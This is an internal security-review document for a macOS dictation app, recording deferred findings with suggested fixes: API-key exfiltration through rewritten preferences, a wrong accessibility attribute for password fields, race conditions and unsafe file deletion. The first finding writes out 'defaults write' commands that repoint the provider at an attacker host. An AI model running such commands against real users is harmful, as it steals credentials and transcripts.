# Deferred Findings (Codex adversarial review)

## Automation Surface (round 1) — pre-existing provider-preference rewrite exposed by Finding 1

### Any same-user process can rewrite FreeTalker's cloud provider preferences and harvest the API key on the user's next ordinary dictation, no automation involved

**Where:** `Sources/FreeTalker/Settings/AppSettings.swift` (`llmProvider`, `cloudLLMBaseURL`,
`cloudLLMModel` — all plain `UserDefaults`-backed `@Published` properties, no per-writer
authentication), read by `AppCoordinator.resolveActiveProcessor()`/`isCloudLLMConfigured` and
paired with the matching Keychain entry (`Keychain.Account.cloudLLMKey(for:)`) whenever cloud
post-processing runs for an ordinary Dictation.

**Why real, and why deferred:** Codex round-1 Finding 1 (CRITICAL) originally described a
confused-deputy exfiltration route THROUGH automation: a same-user process could flip
`automationEnabled` on via `defaults write`, repoint the provider/base-URL/model preferences at an
attacker-controlled endpoint, relaunch FreeTalker, and call `clean up` to have FreeTalker read the
protected Keychain key and send it to that endpoint. This branch closes that specific route by
making `clean up` always run on-device (`AutomationService.cleanUpText` now calls
`AppleFMProcessor` unconditionally, never `AppCoordinator.resolveActiveProcessor()`'s cloud
selection) — see `Sources/FreeTalker/Automation/AutomationService.swift`.

That fix does not touch the underlying weakness Finding 1 exposed: `llmProvider`,
`cloudLLMBaseURL`, and `cloudLLMModel` are ordinary `UserDefaults` values with no authentication of
the writer. ANY process running as the same macOS user — automation enabled or not, FreeTalker
running or not — can already do:

```sh
defaults write org.freetalker.app llmProvider -string "openAI"
defaults write org.freetalker.app cloudLLMBaseURL -string "https://attacker.example/v1"
defaults write org.freetalker.app cloudLLMModel -string "whatever"
```

The next time the user dictates normally (no automation, no Shortcut, just talking) with cloud
post-processing configured, FreeTalker reads the real Keychain API key, pairs it with the
now-attacker-controlled base URL, and sends the transcript (and the key, via the provider's own
Authorization header) to that endpoint. This is a pre-existing gap in how FreeTalker trusts its own
preference store, not something the automation surface introduced — it was simply the route this
PR's adversarial review used to reach it. Fixing `UserDefaults`/Keychain trust boundaries is a
larger change (would need something like a signed/fingerprinted preference bundle, or moving
provider identity into the Keychain item itself so a mismatched base URL is detectable) than this
PR's scope, and is orthogonal to "does automation add a new way to reach the key" — it does not,
after this branch's fix.

**Suggested fix (follow-up PR):** Bind the Keychain-stored key to the specific
provider/base-URL/model triple it was saved for (e.g. store a hash of the triple alongside the key,
or key the Keychain account string on all three rather than just the provider), so a preference
rewrite that doesn't also produce a matching Keychain write is detected and refused rather than
silently paired with the real key.

## Correction Loop — F16

### F16 — LOW — `kAXDocumentAttribute` can't distinguish two tabs sharing a URL, so the correction-fallback document check fails closed in browsers instead of succeeding

**Where:** `Sources/FreeTalker/Core/SelectionAccess.swift` (`correctionFallbackDocumentMatches`,
`isURLShaped`), fed by `InsertionTarget.document`, which is captured on every insertion snapshot
(`Insertion.snapshotTarget`) but is read by this one path only.

**Why real, and why LOW:** `InsertionTarget.document` (`kAXDocumentAttribute`) is captured
unconditionally whenever FreeTalker snapshots an insertion target, but today it has exactly one
reader: `SelectionAccess`'s correction-fallback revalidation, used only when a `SelectionSnapshot`
carries a `correctionDictationID` (Correction Loop signal B's `RecentInsertion`-derived selection —
see `CorrectionTargeting.selectRecentInsertion`). In a Chromium-derived browser this attribute
exposes the tab's page URL, not a per-tab identity — a duplicated tab shares the exact same URL as
its original while being a genuinely different, recycled AX element. `correctionFallbackDocumentMatches`
already recognizes this and refuses (fails closed, `.targetChanged`) whenever the remembered
discriminator is URL-shaped, rather than trusting a URL match as proof of "same document." That's
the correct conservative choice given what's available, but it means a spoken correction (signal B)
declines by design in any browser whenever two tabs happen to share a URL — not a crash or data
corruption, just the feature silently not helping in a case it plausibly could.

**Suggested fix (follow-up PR):** Capture a genuinely per-tab AX identity instead of (or alongside)
`kAXDocumentAttribute` — for example, the browser's selected-tab AX element (`AXSelectedChildren`/
similar under the tab-group role) rather than the document/page URL — and have
`correctionFallbackDocumentMatches` compare that instead of falling back to a URL-shaped string.
That would let signal B succeed in browsers in the common case instead of always declining once two
tabs share a URL.

## Streaming ASR (round 9, final) — F14, F15

Both LOW severity, both deliberately not fixed before merge — the affected paths (the streaming
model reservation and the Settings model-status refresh) are narrow, self-correcting, and
orthogonal to the safety-critical typing/backspace path, so fixing them here would be scope creep
onto polish rather than closing a real hazard. Each gets a dedicated follow-up PR.

### F14 — LOW — streaming model reservation is Boolean, not generation-owned, so it can be cleared while a newer capture still holds it

**Where:** `Sources/FreeTalker/AppCoordinator.swift:2845` (`startLiveStreaming` sets
`streamingModelStore.markCaptureActive(true)`) and `:2926` (`cancelLiveStreaming`'s
`engineTeardownTask` eventually calls `streamingModelStore.markCaptureActive(false)`).

**Why real, and why LOW:** `StreamingModelStore.captureActive` is a plain `Bool` — it records only
"some capture currently wants the model reserved," not which capture. If capture A starts
streaming, is cancelled, and its `engineTeardownTask` teardown is still in flight when capture B
starts and calls `markCaptureActive(true)`, then A's teardown later completes and unconditionally
calls `markCaptureActive(false)` — clearing the reservation while B is still actively using the
model. Settings' Delete button reads `captureActive` as its sole guard (`StreamingModelStore.swift`,
`canDelete`), so a Delete tapped in that window is no longer blocked and could remove the model
files out from under capture B. This is narrow (requires cancelling one live-streaming Recording
and starting another before the first's async teardown finishes, then tapping Delete in that exact
window) and doesn't touch the safety-critical parts of streaming: the batch transcription path and
the final backspace/insert verification in `LiveInsertionSession.finalize` are both unaffected —
worst case here is a mid-capture model deletion for capture B, not silently-wrong typed text.

**Suggested fix (follow-up PR):** Replace the Boolean with a generation/token-owned reservation —
e.g. `StreamingModelStore` tracks the owning generation (or a count of outstanding reservations)
instead of a single flag, and `markCaptureActive(false)` only clears the reservation it itself
holds rather than unconditionally clearing whatever is currently set.

### F15 — LOW — an ambient `StreamingModelStore.refresh()` can apply a stale filesystem snapshot after an intervening download or delete

**Where:** `Sources/FreeTalker/Settings/StreamingModelStore.swift:75` (`refresh(force:)`).

**Why real, and why LOW:** `refresh()` reads `shouldApplyRefresh` once before its detached
filesystem inspection and once after, to avoid clobbering a transitional (`.downloading`/`.busy`)
phase — but nothing ties a given refresh's result to the operation that was current when it
started. Two overlapping refreshes (for example, an `.onAppear`-triggered refresh racing a
user-initiated download's own `force: true` refresh at completion) can interleave so the
earlier-started, later-finishing inspection writes its (now stale) `phase`/`sizeBytes` last,
briefly showing Settings a model as not-downloaded right after a completed download, or as
downloaded right after a completed delete. The next refresh (the periodic `.onAppear` in
`streamingASRSection`, or any subsequent user action) re-inspects the filesystem and repairs it,
so this is a transient UI-only staleness, not a lost download, a leaked file, or anything the
capture-active reservation (F14) or the typing/backspace safety checks depend on.

**Suggested fix (follow-up PR):** Give each `refresh()` call an operation generation (incremented
per `download()`/`delete()`/manual refresh) and discard a refresh's inspection result if the
generation has moved on by the time the detached inspection returns, instead of only guarding on
phase.

## Streaming ASR (round 8) — F4, F9

### F4 — `AccessibilityContext`/`SystemAccessibilityNodeAdapter.isSecure` checks the wrong AX attribute

**Where:** `Sources/FreeTalker/Core/AccessibilityContext.swift:144-154` (`SystemAccessibilityNodeAdapter.isSecure`).

```swift
func isSecure(_ node: AXUIElement) -> Bool {
    let role = stringAttribute(kAXRoleAttribute, from: node)
    ...
    return Self.isSecure(role: role, protected: protected)
}

nonisolated static func isSecure(role: String?, protected: Bool) -> Bool {
    role == "AXSecureTextField" || protected
}
```

**Why real, and why not fixed here:** `"AXSecureTextField"` is a SUBROLE value
(`kAXSubroleAttribute`), not a role value (`kAXRoleAttribute`) — a password field typically
exposes role `AXTextField` with subrole `AXSecureTextField`, so this comparison is always false
for that shape and the helper silently reports "not secure." This code is byte-for-byte identical
to `main` (HEAD) — the Streaming ASR PR does not touch it — so fixing it here would be scope creep
onto a pre-existing bug in a helper several other read-only subsystems (local context capture,
selection access) also depend on, not a regression this PR introduced.

Streaming ASR does NOT use this helper: `Insertion.streamingStartGate`/`Insertion.streamingSafeElement`
(`Sources/FreeTalker/Core/Insertion.swift`) implement a correct, streaming-specific check —
`kAXSubroleAttribute` compared against `"AXSecureTextField"`, plus `AXProtectedContent`, both
failing closed when unreadable — because live typing is a new, more dangerous consumer than this
helper's existing read-only callers.

**Suggested fix (follow-up PR):** Change `SystemAccessibilityNodeAdapter.isSecure` to read
`kAXSubroleAttribute` instead of `kAXRoleAttribute`, and add its own `AXProtectedContent` check
(currently only `isSecure` on the concrete adapter reads it, `isSecure(role:protected:)`'s `role`
parameter should become `subrole`). Once fixed, `Insertion.streamingStartGate`/`streamingSafeElement`
could delegate to it instead of duplicating the check.

### F9 — Crash mid-Recording strands live-typed text with no ledger to reconcile it (accepted residual)

**Where:** `Sources/FreeTalker/Core/LiveInsertionSession.swift` (`ledger` property).

Not a bug to fix: if FreeTalker crashes while a live-streaming Recording is typing partials into
the target app, those characters remain in the user's document, and the in-memory
`LiveInsertionSession.ledger` that would know how many characters to backspace is gone on
relaunch. The ledger is deliberately NOT persisted to disk, and there is deliberately no
auto-backspace-on-relaunch recovery path — reconciling a possibly-stale on-disk ledger against
whatever the document looks like after restart (the user may have kept typing, undone something,
or closed the app) is far more dangerous than leaving the correct-at-the-time partial text as-is.
See the `// ponytail:` comment at the `ledger` declaration.

---

# Deferred Findings (Codex adversarial review, round 7)

These findings from round 7 describe real flaws, but the flawed code is **byte-for-byte identical
to `main` (HEAD)** — the current voice-command-layer PR (PR-A) does not touch it, so fixing it here
would be scope creep onto a pre-existing recovery-subsystem issue, not a regression this PR
introduced. Each entry below has the diff evidence proving that, plus a suggested fix for a
dedicated follow-up PR.

---

## F1 — arbitrary-file deletion via ledger-persisted segment URLs

**Where:** `Sources/FreeTalker/Workflows/Recovery/RecoveryCaptureService.swift:306`

```swift
for segment in try await ledger.committedSegments(captureID: captureID) {
    if journalFileSystem.exists(segment.url) { try journalFileSystem.remove(segment.url) }
}
```

**Why pre-existing:** This exact loop (three lines, unchanged) sits in `cleanupLibraryCommittedSession`,
a method this PR *does* touch extensively (it adds `validateNestedSessionDirectoryOwnership` right
before this loop, plus new marker-cleanup and directory-removal blocks after it — see round-5/6
Codex-attributed comments in the same function). But this specific loop is not part of any diff
hunk:

```
$ git diff HEAD -- Sources/FreeTalker/Workflows/Recovery/RecoveryCaptureService.swift | grep -n '^@@'
5:@@ -42,7 +42,10 @@ ...
17:@@ -167,10 +170,14 @@ ...
33:@@ -263,6 +270,16 @@ ...   (adds validateNestedSessionDirectoryOwnership call)
50:@@ -292,6 +309,42 @@ ...   (adds marker-cleanup block, AFTER this loop)
93:@@ -306,6 +359,38 @@ ...   (adds directory-removal block, AFTER this loop)
```

`git show HEAD:...RecoveryCaptureService.swift` (i.e. `main`) contains the identical
`for segment in try await ledger.committedSegments(...)` loop at its pre-PR line 285-287, with no
validation of `segment.url` there either. The new `validateNestedSessionDirectoryOwnership` this PR
added only proves `session.directory` is exactly `<recoveryRoot>/<captureID>` — it says nothing
about the individual `segment.url` values recorded in the ledger, which is exactly the gap this
finding describes. The gap is real on `main` today, unmodified by this PR.

**Suggested fix (follow-up PR):** Before deleting `segment.url`, validate it the same way
`validateNestedSessionDirectoryOwnership` validates `session.directory`: require
`segment.url.deletingLastPathComponent()` to resolve (lexically and post-symlink) to
`session.directory`, and require the leaf to match the `segment-%08d.wav` pattern for the
segment's own recorded ordinal. This is now cheap to add given `validateNestedSessionDirectoryOwnership`
already exists in this file as a template.

---

## F2 — `RecoveryRetentionService` rejects legitimate shared-root legacy sessions before reconciliation

**Where:** `Sources/FreeTalker/Workflows/Recovery/RecoveryRetentionService.swift:95-112`
(`cleanupLibraryCommittedSessions`), called from `RecoveryReconciler.performReconciliation` (line
~64) *before* the per-session reconciliation loop runs, inside the same `do` block whose `catch`
aborts the entire pass via `report.storeFailure`.

**Why pre-existing:** The whole file has zero diff:

```
$ git diff HEAD -- Sources/FreeTalker/Workflows/Recovery/RecoveryRetentionService.swift | wc -l
0
```

And the call site in `RecoveryReconciler.performReconciliation` — the exact ordering (`purgeExpired`
before the session loop, both inside the same failure-propagating `do`/`catch`) — is also unchanged;
`git show HEAD:...RecoveryReconciler.swift` shows byte-identical code at that location. The two
files this scenario depends on for reaching a legacy shared-root `.libraryCommitted` session
(`LegacyRecoveryImporter.swift`, `RecoveryOwnershipMigrator.swift`) are also zero-diff:

```
$ git diff HEAD -- .../LegacyRecoveryImporter.swift .../RecoveryOwnershipMigrator.swift | wc -l
0
```

The only *new* code nearby is `RecoveryCaptureService.validateNestedSessionDirectoryOwnership`,
which explicitly documents and exempts the legacy `session.directory == directory` layout (line
~398: `guard session.directory.standardizedFileURL.path != directory.standardizedFileURL.path else
{ return }`). `RecoveryRetentionService.cleanupLibraryCommittedSessions` has no equivalent
exemption and never did — it unconditionally builds `expected = lexicalDirectory/<uuid>` and throws
`captureIdentityMismatch` for any `.libraryCommitted` session whose directory isn't that exact
nested path, legacy or not. This double standard is not something this PR created; it's a
pre-existing gap in `RecoveryRetentionService` that this PR's new (correctly legacy-aware) validator
elsewhere simply makes more visible by contrast.

**Suggested fix (follow-up PR):** Give `RecoveryRetentionService.cleanupLibraryCommittedSessions`
the same legacy exemption `RecoveryCaptureService.validateNestedSessionDirectoryOwnership` has, or
better, route both through one shared ownership-validation helper.

---

## F3 — restart bypasses `cleanupNotPermitted`, stranding a job

**Where:** `Sources/FreeTalker/Workflows/Recovery/RecoveryRetentionService.swift:109`
(`try await CaptureJournalService(fileSystem: fileSystem, ledger: ledger).resumeCleanup(captureID:
session.id)`), and the `resumeCleanup`/`cancelAndClean` implementation it calls in
`CaptureJournalService.swift`.

**Why pre-existing:** `RecoveryRetentionService.swift` is zero-diff (see F2 evidence above). This
PR's only change to `CaptureJournalService.swift` is additive — it introduces
`VoiceCommandFinalizationIntent` and a `voiceCommands:` parameter on `finish(_:voiceCommands:)` (see
diff hunks at lines 16-34 and 174-192 of that file). Neither `resumeCleanup` nor `cancelAndClean` —
the methods this finding is about — appear in the diff at all:

```
$ git diff HEAD -- Sources/FreeTalker/Workflows/Recovery/CaptureJournalService.swift
... (only the VoiceCommandFinalizationIntent struct and finish()'s new parameter change)
```

So the behavior this finding describes (recursively deleting a `.libraryCommitted` directory and
ledger row through `CaptureJournalService` without also deleting the recovery job, leaving a
stranded job pointing at a missing source after restart) is identical to `main` today.

**Suggested fix (follow-up PR):** Route file, job, and ledger cleanup for the retention-service path
through the same single finalizer `RecoveryCaptureService.cleanupLibraryCommittedSession` already
uses for the on-completion path, instead of `RecoveryRetentionService` calling
`CaptureJournalService.resumeCleanup` directly.

---

## Note on scope discipline

Per the round-7 review brief, only findings whose flawed behavior is introduced or made worse by
this PR's diff were fixed in this pass (with regression tests). F1/F2/F3 above were deliberately
left untouched because "fix root causes, minimal impact" here means not rewriting pre-existing
`RecoveryRetentionService`/`RecoveryCaptureService` segment-deletion behavior as a side effect of the
voice-command-layer PR. All three are real and worth a dedicated follow-up PR.
